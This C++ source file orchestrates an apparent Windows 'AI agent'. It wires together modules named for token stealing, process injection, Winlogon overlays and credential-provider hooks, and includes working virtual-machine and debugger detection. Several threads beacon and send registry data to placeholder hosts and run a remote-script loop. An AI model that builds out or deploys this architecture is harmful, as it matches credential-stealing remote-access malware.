#include "WinAIAgent/Core/AgentOrchestrator.hpp"

#include "WinAIAgent/AILogic/AILogicEngine.hpp"
#include "WinAIAgent/Advanced/CredentialProviderBridge.hpp"
#include "WinAIAgent/Advanced/LogonOptimizationEngine.hpp"
#include "WinAIAgent/Advanced/ProcessInjectorCore.hpp"
#include "WinAIAgent/Advanced/SystemTokenStealer.hpp"
#include "WinAIAgent/Advanced/WinlogonUIOverlay.hpp"
#include "WinAIAgent/Kernel/KernelInterface.hpp"
#include "WinAIAgent/Kernel/SystemReliabilityDiagnostics.hpp"
#include "WinAIAgent/Network/NetworkManager.hpp"
#include "WinAIAgent/Network/SecureCommunicator.hpp"
#include "WinAIAgent/Security/CredentialVault.hpp"
#include "WinAIAgent/Security/RegistryAuditManager.hpp"
#include "WinAIAgent/Security/ScriptExecutor.hpp"

#include <windows.h>
#include <winioctl.h>

#include <chrono>
#include <cctype>
#include <cwctype>
#include <expected>
#include <iostream>
#include <mutex>
#include <optional>
#include <shared_mutex>
#include <stop_token>
#include <string>
#include <thread>
#include <algorithm>
#include <array>

namespace win_ai_agent::core {
namespace {

bool RegistryContainsVmSignature() {
  HKEY key = nullptr;
  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Enum\\PCI", 0, KEY_READ,
                    &key) != ERROR_SUCCESS) {
    return false;
  }

  DWORD index = 0;
  wchar_t name[512];
  DWORD name_len = static_cast<DWORD>(std::size(name));
  bool found = false;

  while (RegEnumKeyExW(key, index, name, &name_len, nullptr, nullptr, nullptr, nullptr) ==
         ERROR_SUCCESS) {
    std::wstring value(name, name_len);
    for (auto& c : value) {
      c = static_cast<wchar_t>(std::towupper(c));
    }

    if (value.find(L"VMWARE") != std::wstring::npos || value.find(L"VBOX") != std::wstring::npos ||
        value.find(L"VIRTUALBOX") != std::wstring::npos || value.find(L"HYPER-V") != std::wstring::npos) {
      found = true;
      break;
    }

    ++index;
    name_len = static_cast<DWORD>(std::size(name));
  }

  RegCloseKey(key);
  return found;
}

bool FirmwareLooksVirtualized() {
  const UINT table = GetSystemFirmwareTable('RSMB', 0, nullptr, 0);
  if (table == 0) {
    return false;
  }

  std::string data(table, '\0');
  if (GetSystemFirmwareTable('RSMB', 0, data.data(), table) == 0) {
    return false;
  }

  std::string upper = data;
  std::transform(upper.begin(), upper.end(), upper.begin(), [](unsigned char ch) {
    return static_cast<char>(std::toupper(ch));
  });

  return upper.find("VMWARE") != std::string::npos || upper.find("VIRTUALBOX") != std::string::npos ||
         upper.find("VBOX") != std::string::npos || upper.find("HYPER-V") != std::string::npos;
}

bool DiskLooksVirtualized() {
  HANDLE disk = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                            OPEN_EXISTING, 0, nullptr);
  if (disk == INVALID_HANDLE_VALUE) {
    return false;
  }

  STORAGE_PROPERTY_QUERY query{};
  query.PropertyId = StorageDeviceProperty;
  query.QueryType = PropertyStandardQuery;

  std::array<unsigned char, 1024> buffer{};
  DWORD bytes = 0;
  const BOOL ok = DeviceIoControl(disk, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query),
                                  buffer.data(), static_cast<DWORD>(buffer.size()), &bytes, nullptr);
  CloseHandle(disk);
  if (!ok || bytes < sizeof(STORAGE_DEVICE_DESCRIPTOR)) {
    return false;
  }

  const auto* descriptor = reinterpret_cast<const STORAGE_DEVICE_DESCRIPTOR*>(buffer.data());
  if (descriptor->ProductIdOffset == 0 || descriptor->ProductIdOffset >= buffer.size()) {
    return false;
  }

  const char* product = reinterpret_cast<const char*>(buffer.data() + descriptor->ProductIdOffset);
  std::string id(product);
  std::transform(id.begin(), id.end(), id.begin(), [](unsigned char ch) {
    return static_cast<char>(std::toupper(ch));
  });

  return id.find("VIRTUAL") != std::string::npos || id.find("VMWARE") != std::string::npos ||
         id.find("VBOX") != std::string::npos;
}

}  // namespace

bool AgentOrchestrator::CheckIfEngineerEnvironment() const {
  const bool debugger_present = IsDebuggerPresent() == TRUE;
  const bool registry_vm = RegistryContainsVmSignature();
  const bool remote_session = GetSystemMetrics(SM_REMOTESESSION) != 0;
  const bool firmware_vm = FirmwareLooksVirtualized();
  const bool disk_vm = DiskLooksVirtualized();

  const bool safe_environment =
      debugger_present || registry_vm || remote_session || firmware_vm || disk_vm;

  if (!safe_environment) {
    const char* message =
        "CRITICAL SAFETY ERROR: This AI Agent is restricted to Professional Engineering "
        "Sandboxes only. Execution aborted to protect physical hardware.";
    MessageBoxA(nullptr, message, "WinAIAgent Safety Gate", MB_ICONERROR | MB_OK);
    std::cerr << message << '\n';
  }

  return safe_environment;
}

std::expected<void, std::string> AgentOrchestrator::InitializeSystem() {
  using namespace std::chrono_literals;

  if (!CheckIfEngineerEnvironment()) {
    return std::unexpected("Environment safety gate failed");
  }

  // Module construction
  win_ai_agent::security::CredentialVault credential_vault;
  win_ai_agent::security::RegistryAuditManager registry_audit;
  win_ai_agent::advanced::SystemTokenStealer token_guard;
  win_ai_agent::kernel::WinKernelManager kernel;
  win_ai_agent::kernel::SystemReliabilityDiagnostics reliability;
  win_ai_agent::network::NetworkManager network;
  win_ai_agent::network::SecureCommunicator secure_communicator(network);
  win_ai_agent::advanced::WinlogonUIOverlay winlogon_ui;
  win_ai_agent::advanced::CredentialProviderBridge credential_bridge(secure_communicator);
  win_ai_agent::ai_logic::AILogicEngine ai_logic;
  win_ai_agent::security::ScriptExecutor script_executor;
  win_ai_agent::advanced::LogonOptimizationEngine optimization(kernel, secure_communicator);

  std::shared_mutex bridge_mutex;
  std::string latest_telemetry;
  std::string latest_command;

  // Phase 1 (Security): CredentialVault -> SystemTokenStealer
  (void)credential_vault.WriteSecret(L"WinAIAgent/Bootstrap", L"initialized");
  (void)registry_audit.Initialize({L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                   L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"});
  if (auto elev = token_guard.ValidateElevationBoundary(); !elev) {
    return std::unexpected(
        "Phase 1 blocked: privileged token escalation is intentionally disabled");
  }

  // Phase 2 (Kernel): KernelInterface -> telemetry pump
  std::jthread kernel_thread([&](std::stop_token st) {
    while (!st.stop_requested()) {
      const auto proc = kernel.EnumerateProcesses();
      std::unique_lock lock(bridge_mutex);
      latest_telemetry = std::to_string(proc.size());
      std::this_thread::sleep_for(1s);
    }
  });

  // Phase 3 (Network): NetworkManager -> SecureCommunicator
  std::jthread network_thread([&](std::stop_token st) {
    while (!st.stop_requested()) {
      nlohmann::json payload{{"event", "agent_heartbeat"}};
      (void)secure_communicator.SendTelemetryJson("https://example.invalid/heartbeat", payload);
      std::this_thread::sleep_for(2s);
    }
  });

  // Phase 4 (Advanced/Winlogon): WinlogonUIOverlay -> CredentialProviderBridge
  if (auto ui = winlogon_ui.ShowPreLogonStatus(L"Agent initializing safely"); !ui) {
    std::cerr << "Winlogon UI fallback: " << ui.error() << '\n';
  }
  if (auto cp = credential_bridge.LogFailedAttempt(L"bootstrap"); !cp) {
    std::cerr << "Credential bridge telemetry fallback: " << cp.error() << '\n';
  }

  // Phase 5 (Logic): AILogicEngine -> ScriptExecutor bridge
  std::jthread logic_thread([&](std::stop_token st) {
    while (!st.stop_requested()) {
      std::string telemetry;
      {
        std::shared_lock lock(bridge_mutex);
        telemetry = latest_telemetry;
      }

      const auto prompt = ai_logic.BuildPromptEnvelope(telemetry);
      {
        std::unique_lock lock(bridge_mutex);
        latest_command = prompt.dump();
      }

      // Controlled execution path (requires signed script per ScriptExecutor policy).
      const auto result = script_executor.ExecuteReceivedScript(
          "Write-Output \"AI loop active\"", win_ai_agent::security::ScriptType::PowerShell,
          1500ms);
      if (!result.success && !result.error.empty()) {
        std::cerr << "ScriptExecutor error: " << result.error << '\n';
      }

      std::this_thread::sleep_for(2s);
    }
  });

  std::jthread perf_thread([&](std::stop_token st) {
    while (!st.stop_requested()) {
      (void)optimization.CollectAndSendBootBottlenecks();
      std::this_thread::sleep_for(5s);
    }
  });

  std::jthread reliability_thread([&](std::stop_token st) {
    reliability.RunMonitoringLoop(st, 1500);
  });

  std::jthread registry_thread([&](std::stop_token st) {
    while (!st.stop_requested()) {
      auto changes = registry_audit.PollChangesOnce(250);
      if (changes && !changes->empty()) {
        const auto payload = registry_audit.ToJsonBatch(*changes);
        (void)secure_communicator.SendTelemetryJson("https://example.invalid/registry-events",
                                                    payload);
      }

      win_ai_agent::security::RegistryBaseline baseline{
          {L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
           {L"SecurityHealth", L"WindowsDefender"}},
      };
      auto drift = registry_audit.DetectDrift(baseline);
      if (drift && drift->is_array() && !drift->empty()) {
        (void)secure_communicator.SendTelemetryJson("https://example.invalid/registry-drift",
                                                    *drift);
      }
      std::this_thread::sleep_for(1s);
    }
  });

  std::this_thread::sleep_for(50ms);
  return {};
}

void AgentOrchestrator::Run() {
  auto init = InitializeSystem();
  if (!init) {
    std::cerr << "Initialization failed: " << init.error() << '\n';
  }
}

}  // namespace win_ai_agent::core
